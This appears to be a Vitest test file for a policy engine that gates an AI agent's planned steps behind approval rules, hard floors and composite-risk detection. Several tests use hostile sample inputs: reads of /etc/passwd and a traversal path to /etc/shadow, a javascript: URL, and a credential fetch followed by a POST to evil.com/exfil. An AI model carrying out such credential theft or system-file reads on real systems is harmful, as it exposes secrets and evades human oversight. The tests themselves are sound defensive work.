import { describe, it, expect, vi } from 'vitest';

import type {
  ExecutionPlan,
  ExecutionStep,
  Logger,
  StepValidation,
} from '@meridian/shared';

import type { PolicyEngineConfig } from './policy-engine.js';
import { HARD_FLOOR_ACTIONS, evaluatePlan } from './policy-engine.js';
import type { ActionType } from './risk-assessor.js';

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

function createStep(overrides?: Partial<ExecutionStep>): ExecutionStep {
  return {
    id: 'step-1',
    gear: 'test-gear',
    action: 'test-action',
    parameters: {},
    riskLevel: 'low',
    ...overrides,
  };
}

function createPlan(
  steps: ExecutionStep[],
  overrides?: Partial<ExecutionPlan>,
): ExecutionPlan {
  return {
    id: 'plan-001',
    jobId: 'job-001',
    steps,
    ...overrides,
  };
}

function createConfig(overrides?: Partial<PolicyEngineConfig>): PolicyEngineConfig {
  return {
    workspacePath: '/data/workspace',
    allowlistedDomains: ['api.example.com', 'cdn.example.com'],
    ...overrides,
  };
}

interface MockLogger extends Logger {
  _warnFn: ReturnType<typeof vi.fn>;
  _infoFn: ReturnType<typeof vi.fn>;
}

function createMockLogger(): MockLogger {
  const warnFn = vi.fn();
  const infoFn = vi.fn();
  return {
    error: vi.fn(),
    warn: warnFn,
    info: infoFn,
    debug: vi.fn(),
    child: vi.fn().mockReturnThis(),
    close: vi.fn(),
    _warnFn: warnFn,
    _infoFn: infoFn,
  } as unknown as MockLogger;
}

/** Safely get a step result by index, failing the test if missing. */
function getStep(results: StepValidation[], index: number): StepValidation {
  const step = results[index];
  expect(step).toBeDefined();
  return step as StepValidation;
}

// ---------------------------------------------------------------------------
// Default policies — all 10 action types
// ---------------------------------------------------------------------------

describe('evaluatePlan — default policies', () => {
  describe('read local files', () => {
    it('should approve file reads within workspace path', () => {
      const step = createStep({
        gear: 'file-manager',
        action: 'read',
        parameters: { path: '/data/workspace/notes.txt' },
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(result.verdict).toBe('approved');
      expect(getStep(result.stepResults, 0).verdict).toBe('approved');
      expect(getStep(result.stepResults, 0).category).toBe('filesystem');
    });

    it('should require approval for file reads outside workspace', () => {
      const step = createStep({
        gear: 'file-manager',
        action: 'read',
        parameters: { path: '/etc/passwd' },
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(result.verdict).toBe('needs_user_approval');
      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });

    it('should require approval when file path is not specified', () => {
      const step = createStep({
        gear: 'file-manager',
        action: 'read',
        parameters: {},
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });

    it('should block path traversal attempts', () => {
      const step = createStep({
        gear: 'file-manager',
        action: 'read',
        parameters: { path: '/data/workspace/../../etc/shadow' },
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });

    it('should require approval for relative paths (no leading slash)', () => {
      const step = createStep({
        gear: 'file-manager',
        action: 'read',
        parameters: { path: 'workspace/file.txt' },
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });

    it('should require approval for dot-relative paths', () => {
      const step = createStep({
        gear: 'file-manager',
        action: 'read',
        parameters: { path: './data/workspace/file.txt' },
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });
  });

  describe('write/modify files', () => {
    it('should approve file writes within workspace', () => {
      const step = createStep({
        gear: 'file-manager',
        action: 'write',
        parameters: { path: '/data/workspace/output.txt' },
        riskLevel: 'medium',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(result.verdict).toBe('approved');
      expect(getStep(result.stepResults, 0).verdict).toBe('approved');
    });

    it('should require approval for file writes outside workspace', () => {
      const step = createStep({
        gear: 'file-manager',
        action: 'write',
        parameters: { path: '/home/user/document.txt' },
        riskLevel: 'medium',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });
  });

  describe('delete files', () => {
    it('should always require approval for file deletion', () => {
      const step = createStep({
        gear: 'file-manager',
        action: 'delete',
        parameters: { path: '/data/workspace/temp.txt' },
        riskLevel: 'high',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
      expect(getStep(result.stepResults, 0).riskLevel).toBe('high');
    });

    it('should require approval even for workspace paths', () => {
      const step = createStep({
        gear: 'file-manager',
        action: 'delete',
        parameters: { path: '/data/workspace/file.txt' },
        riskLevel: 'high',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });
  });

  describe('network requests (GET)', () => {
    it('should approve GET requests to allowlisted domains', () => {
      const step = createStep({
        gear: 'web-fetch',
        action: 'get',
        parameters: { url: 'https://api.example.com/data' },
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(result.verdict).toBe('approved');
      expect(getStep(result.stepResults, 0).verdict).toBe('approved');
    });

    it('should approve GET to subdomains of allowlisted domains', () => {
      const step = createStep({
        gear: 'web-fetch',
        action: 'get',
        parameters: { url: 'https://v2.api.example.com/resource' },
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('approved');
    });

    it('should require approval for non-allowlisted domains', () => {
      const step = createStep({
        gear: 'web-fetch',
        action: 'get',
        parameters: { url: 'https://unknown-api.com/data' },
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });

    it('should require approval when no URL is provided', () => {
      const step = createStep({
        gear: 'web-fetch',
        action: 'get',
        parameters: {},
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });

    it('should require approval for malformed URLs', () => {
      const step = createStep({
        gear: 'web-fetch',
        action: 'get',
        parameters: { url: 'not-a-valid-url' },
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });

    it('should require approval for javascript: protocol URLs', () => {
      const step = createStep({
        gear: 'web-fetch',
        action: 'get',
        parameters: { url: 'javascript:alert(1)' },
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });

    it('should require approval for file:// protocol URLs', () => {
      const step = createStep({
        gear: 'web-fetch',
        action: 'get',
        parameters: { url: 'file:///etc/passwd' },
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });
  });

  describe('network requests (POST/PUT/DELETE)', () => {
    it('should require approval for POST requests', () => {
      const step = createStep({
        gear: 'web-fetch',
        action: 'fetch',
        parameters: { method: 'POST', url: 'https://api.example.com/data' },
        riskLevel: 'high',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });

    it('should require approval for PUT requests', () => {
      const step = createStep({
        gear: 'web-fetch',
        action: 'fetch',
        parameters: { method: 'PUT', url: 'https://api.example.com/data' },
        riskLevel: 'high',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });

    it('should require approval for DELETE requests', () => {
      const step = createStep({
        gear: 'web-fetch',
        action: 'fetch',
        parameters: { method: 'DELETE', url: 'https://api.example.com/items/1' },
        riskLevel: 'high',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });
  });

  describe('shell command execution', () => {
    it('should always require approval for shell commands', () => {
      const step = createStep({
        gear: 'shell',
        action: 'execute',
        parameters: { command: 'ls -la' },
        riskLevel: 'critical',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
      expect(getStep(result.stepResults, 0).riskLevel).toBe('critical');
    });
  });

  describe('credential usage', () => {
    it('should require approval for credential access', () => {
      const step = createStep({
        gear: 'credential-manager',
        action: 'get',
        parameters: { name: 'api-key' },
        riskLevel: 'medium',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
      expect(getStep(result.stepResults, 0).category).toBe('security');
    });

    it('should log credential usage for audit', () => {
      const step = createStep({
        gear: 'credential-manager',
        action: 'get',
        parameters: { name: 'api-key' },
        riskLevel: 'medium',
      });
      const logger = createMockLogger();
      evaluatePlan(createPlan([step]), createConfig(), logger);

      expect(logger._infoFn).toHaveBeenCalledWith(
        'Credential usage detected',
        expect.objectContaining({
          stepId: 'step-1',
          gear: 'credential-manager',
          action: 'get',
          verdict: 'needs_user_approval',
        }),
      );
    });
  });

  describe('financial transactions', () => {
    it('should always require approval for financial transactions', () => {
      const step = createStep({
        gear: 'payment',
        action: 'charge',
        parameters: { amount: 50, currency: 'USD' },
        riskLevel: 'critical',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
      expect(getStep(result.stepResults, 0).riskLevel).toBe('critical');
    });

    it('should reject transactions exceeding hard limit', () => {
      const step = createStep({
        gear: 'payment',
        action: 'charge',
        parameters: { amount: 1000, currency: 'USD' },
        riskLevel: 'critical',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig({ maxTransactionAmountUsd: 500 }),
        createMockLogger(),
      );

      expect(result.verdict).toBe('rejected');
      expect(getStep(result.stepResults, 0).verdict).toBe('rejected');
    });

    it('should allow transactions under hard limit with user approval', () => {
      const step = createStep({
        gear: 'payment',
        action: 'charge',
        parameters: { amount: 100, currency: 'USD' },
        riskLevel: 'critical',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig({ maxTransactionAmountUsd: 500 }),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });
  });

  describe('sending messages', () => {
    it('should require approval for sending emails', () => {
      const step = createStep({
        gear: 'email-sender',
        action: 'send',
        parameters: { to: 'user@example.com', subject: 'Hello' },
        riskLevel: 'high',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
      expect(getStep(result.stepResults, 0).category).toBe('communication');
    });

    it('should require approval for sending chat messages', () => {
      const step = createStep({
        gear: 'slack',
        action: 'post',
        parameters: { channel: '#general', text: 'Hello' },
        riskLevel: 'high',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });
  });

  describe('system configuration changes', () => {
    it('should always require approval for system config changes', () => {
      const step = createStep({
        gear: 'config-manager',
        action: 'update',
        parameters: { key: 'max_workers', value: 8 },
        riskLevel: 'critical',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
      expect(getStep(result.stepResults, 0).riskLevel).toBe('critical');
    });
  });

  describe('unknown action types', () => {
    it('should default to requiring user approval', () => {
      const step = createStep({
        gear: 'custom-tool',
        action: 'process',
        parameters: {},
        riskLevel: 'low',
      });
      const result = evaluatePlan(
        createPlan([step]),
        createConfig(),
        createMockLogger(),
      );

      expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
    });
  });
});

// ---------------------------------------------------------------------------
// Hard floor policies
// ---------------------------------------------------------------------------

describe('evaluatePlan — hard floor policies', () => {
  it('should have delete_files as a hard floor action', () => {
    expect(HARD_FLOOR_ACTIONS.has('delete_files')).toBe(true);
  });

  it('should have shell_execute as a hard floor action', () => {
    expect(HARD_FLOOR_ACTIONS.has('shell_execute')).toBe(true);
  });

  it('should have financial_transaction as a hard floor action', () => {
    expect(HARD_FLOOR_ACTIONS.has('financial_transaction')).toBe(true);
  });

  it('should have system_config as a hard floor action', () => {
    expect(HARD_FLOOR_ACTIONS.has('system_config')).toBe(true);
  });

  it('should not allow user policy to weaken delete_files', () => {
    const step = createStep({
      gear: 'file-manager',
      action: 'delete',
      parameters: { path: '/data/workspace/file.txt' },
      riskLevel: 'high',
    });
    const config = createConfig({
      userPolicies: [
        { actionType: 'delete_files' as ActionType, verdict: 'approved' },
      ],
    });
    const result = evaluatePlan(createPlan([step]), config, createMockLogger());

    expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
  });

  it('should not allow user policy to weaken shell_execute', () => {
    const step = createStep({
      gear: 'shell',
      action: 'execute',
      parameters: { command: 'echo hi' },
      riskLevel: 'critical',
    });
    const config = createConfig({
      userPolicies: [
        { actionType: 'shell_execute' as ActionType, verdict: 'approved' },
      ],
    });
    const result = evaluatePlan(createPlan([step]), config, createMockLogger());

    expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
  });

  it('should not allow user policy to weaken financial_transaction', () => {
    const step = createStep({
      gear: 'payment',
      action: 'charge',
      parameters: { amount: 10, currency: 'USD' },
      riskLevel: 'critical',
    });
    const config = createConfig({
      userPolicies: [
        { actionType: 'financial_transaction' as ActionType, verdict: 'approved' },
      ],
    });
    const result = evaluatePlan(createPlan([step]), config, createMockLogger());

    expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
  });

  it('should not allow user policy to weaken system_config', () => {
    const step = createStep({
      gear: 'config-manager',
      action: 'update',
      parameters: {},
      riskLevel: 'critical',
    });
    const config = createConfig({
      userPolicies: [
        { actionType: 'system_config' as ActionType, verdict: 'approved' },
      ],
    });
    const result = evaluatePlan(createPlan([step]), config, createMockLogger());

    expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
  });
});

// ---------------------------------------------------------------------------
// Custom user policies (stricter only)
// ---------------------------------------------------------------------------

describe('evaluatePlan — user policy overrides', () => {
  it('should allow stricter override on read_files', () => {
    const step = createStep({
      gear: 'file-manager',
      action: 'read',
      parameters: { path: '/data/workspace/file.txt' },
      riskLevel: 'low',
    });
    const config = createConfig({
      userPolicies: [
        { actionType: 'read_files' as ActionType, verdict: 'needs_user_approval' },
      ],
    });
    const result = evaluatePlan(createPlan([step]), config, createMockLogger());

    // Would normally be approved (within workspace) but user made it stricter
    expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
  });

  it('should allow stricter override on network_get', () => {
    const step = createStep({
      gear: 'web-fetch',
      action: 'get',
      parameters: { url: 'https://api.example.com/data' },
      riskLevel: 'low',
    });
    const config = createConfig({
      userPolicies: [
        { actionType: 'network_get' as ActionType, verdict: 'needs_user_approval' },
      ],
    });
    const result = evaluatePlan(createPlan([step]), config, createMockLogger());

    // Would normally be approved (allowlisted domain) but user made it stricter
    expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
  });

  it('should not allow weaker override on network_mutate', () => {
    const step = createStep({
      gear: 'web-fetch',
      action: 'fetch',
      parameters: { method: 'POST', url: 'https://api.example.com/data' },
      riskLevel: 'high',
    });
    const config = createConfig({
      userPolicies: [
        { actionType: 'network_mutate' as ActionType, verdict: 'approved' },
      ],
    });
    const result = evaluatePlan(createPlan([step]), config, createMockLogger());

    // User tried to weaken, should remain needs_user_approval
    expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
  });

  it('should not allow weaker override on credential_usage', () => {
    const step = createStep({
      gear: 'credential-manager',
      action: 'get',
      parameters: { name: 'secret' },
      riskLevel: 'medium',
    });
    const config = createConfig({
      userPolicies: [
        { actionType: 'credential_usage' as ActionType, verdict: 'approved' },
      ],
    });
    const result = evaluatePlan(createPlan([step]), config, createMockLogger());

    expect(getStep(result.stepResults, 0).verdict).toBe('needs_user_approval');
  });

  it('should allow user to escalate to rejected for non-floor actions', () => {
    const step = createStep({
      gear: 'email-sender',
      action: 'send',
      parameters: {},
      riskLevel: 'high',
    });
    const config = createConfig({
      userPolicies: [
        { actionType: 'send_message' as ActionType, verdict: 'rejected' },
      ],
    });
    const result = evaluatePlan(createPlan([step]), config, createMockLogger());

    expect(getStep(result.stepResults, 0).verdict).toBe('rejected');
    expect(result.verdict).toBe('rejected');
  });
});

// ---------------------------------------------------------------------------
// Composite risk detection
// ---------------------------------------------------------------------------

describe('evaluatePlan — composite risk detection', () => {
  it('should detect credential exfiltration (credentials + network)', () => {
    const steps = [
      createStep({
        id: 'step-1',
        gear: 'credential-manager',
        action: 'get',
        parameters: { name: 'api-key' },
        riskLevel: 'medium',
      }),
      createStep({
        id: 'step-2',
        gear: 'web-fetch',
        action: 'fetch',
        parameters: { method: 'POST', url: 'https://evil.com/exfil' },
        riskLevel: 'high',
      }),
    ];
    const logger = createMockLogger();
    const result = evaluatePlan(createPlan(steps), createConfig(), logger);

    expect(result.reasoning).toContain('Credential access');
    expect(result.reasoning).toContain('exfiltration');
    expect(logger._warnFn).toHaveBeenCalledWith(
      'Composite risk patterns detected',
      expect.objectContaining({ planId: 'plan-001' }),
    );
  });

  it('should detect data leak (file read + send message)', () => {
    const steps = [
      createStep({
        id: 'step-1',
        gear: 'file-manager',
        action: 'read',
        parameters: { path: '/data/workspace/secrets.txt' },
        riskLevel: 'low',
      }),
      createStep({
        id: 'step-2',
        gear: 'email-sender',
        action: 'send',
        parameters: { to: 'user@example.com' },
        riskLevel: 'high',
      }),
    ];
    const result = evaluatePlan(createPlan(steps), createConfig(), createMockLogger());

    expect(result.reasoning).toContain('data leak');
  });

  it('should detect file exfiltration (file read + network request)', () => {
    const steps = [
      createStep({
        id: 'step-1',
        gear: 'file-manager',
        action: 'read',
        parameters: { path: '/data/workspace/data.csv' },
        riskLevel: 'low',
      }),
      createStep({
        id: 'step-2',
        gear: 'web-fetch',
        action: 'fetch',
        parameters: { method: 'POST', url: 'https://example.com/upload' },
        riskLevel: 'high',
      }),
    ];
    const result = evaluatePlan(createPlan(steps), createConfig(), createMockLogger());

    expect(result.reasoning).toContain('file exfiltration');
  });

  it('should detect mass deletion (3+ delete operations)', () => {
    const steps = [
      createStep({
        id: 'step-1',
        gear: 'file-manager',
        action: 'delete',
        parameters: { path: '/data/workspace/a.txt' },
        riskLevel: 'high',
      }),
      createStep({
        id: 'step-2',
        gear: 'file-manager',
        action: 'delete',
        parameters: { path: '/data/workspace/b.txt' },
        riskLevel: 'high',
      }),
      createStep({
        id: 'step-3',
        gear: 'file-manager',
        action: 'delete',
        parameters: { path: '/data/workspace/c.txt' },
        riskLevel: 'high',
      }),
    ];
    const result = evaluatePlan(createPlan(steps), createConfig(), createMockLogger());

    expect(result.reasoning).toContain('mass destruction');
  });

  it('should escalate overall risk for composite patterns', () => {
    const steps = [
      createStep({
        id: 'step-1',
        gear: 'file-manager',
        action: 'read',
        parameters: { path: '/data/workspace/data.csv' },
        riskLevel: 'low',
      }),
      createStep({
        id: 'step-2',
        gear: 'email-sender',
        action: 'send',
        parameters: { to: 'user@example.com' },
        riskLevel: 'high',
      }),
    ];
    const result = evaluatePlan(createPlan(steps), createConfig(), createMockLogger());

    expect(result.overallRisk).toBe('high');
  });
});

// ---------------------------------------------------------------------------
// Risk divergence logging
// ---------------------------------------------------------------------------

describe('evaluatePlan — risk divergence', () => {
  it('should log divergence when Scout says low but Sentinel assesses high', () => {
    const step = createStep({
      gear: 'file-manager',
      action: 'delete',
      parameters: { path: '/data/workspace/file.txt' },
      riskLevel: 'low', // Scout says low, Sentinel will assess as high
    });
    const logger = createMockLogger();
    const result = evaluatePlan(createPlan([step]), createConfig(), logger);

    expect(logger._warnFn).toHaveBeenCalledWith(
      'Risk divergence detected',
      expect.objectContaining({
        stepId: 'step-1',
        scoutRisk: 'low',
        sentinelRisk: 'high',
        difference: 2,
      }),
    );
    expect(result.metadata).toBeDefined();
    expect(result.metadata).toHaveProperty('divergences');
  });

  it('should not log divergence for small risk differences', () => {
    const step = createStep({
      gear: 'file-manager',
      action: 'write',
      parameters: { path: '/home/user/file.txt' },
      riskLevel: 'medium', // Scout says medium, Sentinel will say high
    });
    const logger = createMockLogger();
    evaluatePlan(createPlan([step]), createConfig(), logger);

    // Difference is only 1 level, should not log divergence
    expect(logger._warnFn).not.toHaveBeenCalledWith(
      'Risk divergence detected',
      expect.anything(),
    );
  });
});

// ---------------------------------------------------------------------------
// Overall verdict computation
// ---------------------------------------------------------------------------

describe('evaluatePlan — overall verdict', () => {
  it('should return approved when all steps are approved', () => {
    const steps = [
      createStep({
        id: 'step-1',
        gear: 'file-manager',
        action: 'read',
        parameters: { path: '/data/workspace/a.txt' },
        riskLevel: 'low',
      }),
      createStep({
        id: 'step-2',
        gear: 'file-manager',
        action: 'write',
        parameters: { path: '/data/workspace/b.txt' },
        riskLevel: 'medium',
      }),
    ];
    const result = evaluatePlan(createPlan(steps), createConfig(), createMockLogger());

    expect(result.verdict).toBe('approved');
  });

  it('should return needs_user_approval when any step needs approval', () => {
    const steps = [
      createStep({
        id: 'step-1',
        gear: 'file-manager',
        action: 'read',
        parameters: { path: '/data/workspace/a.txt' },
        riskLevel: 'low',
      }),
      createStep({
        id: 'step-2',
        gear: 'shell',
        action: 'execute',
        parameters: { command: 'ls' },
        riskLevel: 'critical',
      }),
    ];
    const result = evaluatePlan(createPlan(steps), createConfig(), createMockLogger());

    expect(result.verdict).toBe('needs_user_approval');
  });

  it('should return rejected when any step is rejected', () => {
    const steps = [
      createStep({
        id: 'step-1',
        gear: 'file-manager',
        action: 'read',
        parameters: { path: '/data/workspace/a.txt' },
        riskLevel: 'low',
      }),
      createStep({
        id: 'step-2',
        gear: 'payment',
        action: 'charge',
        parameters: { amount: 10000, currency: 'USD' },
        riskLevel: 'critical',
      }),
    ];
    const result = evaluatePlan(
      createPlan(steps),
      createConfig({ maxTransactionAmountUsd: 500 }),
      createMockLogger(),
    );

    expect(result.verdict).toBe('rejected');
  });

  it('should compute overall risk as maximum across steps', () => {
    const steps = [
      createStep({
        id: 'step-1',
        gear: 'file-manager',
        action: 'read',
        parameters: { path: '/data/workspace/a.txt' },
        riskLevel: 'low',
      }),
      createStep({
        id: 'step-2',
        gear: 'shell',
        action: 'execute',
        parameters: { command: 'ls' },
        riskLevel: 'critical',
      }),
    ];
    const result = evaluatePlan(createPlan(steps), createConfig(), createMockLogger());

    expect(result.overallRisk).toBe('critical');
  });

  it('should produce a valid ValidationResult with all required fields', () => {
    const step = createStep({
      gear: 'file-manager',
      action: 'read',
      parameters: { path: '/data/workspace/file.txt' },
      riskLevel: 'low',
    });
    const result = evaluatePlan(createPlan([step]), createConfig(), createMockLogger());

    expect(result.id).toBeDefined();
    expect(result.id.length).toBeGreaterThan(0);
    expect(result.planId).toBe('plan-001');
    expect(result.verdict).toBeDefined();
    expect(result.stepResults).toHaveLength(1);
    expect(result.overallRisk).toBeDefined();
  });
});

// ---------------------------------------------------------------------------
// Multi-step plans
// ---------------------------------------------------------------------------

describe('evaluatePlan — multi-step plans', () => {
  it('should evaluate each step independently', () => {
    const steps = [
      createStep({
        id: 'step-1',
        gear: 'file-manager',
        action: 'read',
        parameters: { path: '/data/workspace/a.txt' },
        riskLevel: 'low',
      }),
      createStep({
        id: 'step-2',
        gear: 'file-manager',
        action: 'delete',
        parameters: { path: '/data/workspace/b.txt' },
        riskLevel: 'high',
      }),
      createStep({
        id: 'step-3',
        gear: 'web-fetch',
        action: 'get',
        parameters: { url: 'https://api.example.com/data' },
        riskLevel: 'low',
      }),
    ];
    const result = evaluatePlan(createPlan(steps), createConfig(), createMockLogger());

    expect(result.stepResults).toHaveLength(3);
    expect(getStep(result.stepResults, 0).verdict).toBe('approved');
    expect(getStep(result.stepResults, 1).verdict).toBe('needs_user_approval');
    expect(getStep(result.stepResults, 2).verdict).toBe('approved');
    expect(result.verdict).toBe('needs_user_approval');
  });

  it('should handle empty plan gracefully', () => {
    const result = evaluatePlan(
      createPlan([]),
      createConfig(),
      createMockLogger(),
    );

    expect(result.verdict).toBe('approved');
    expect(result.stepResults).toHaveLength(0);
  });
});
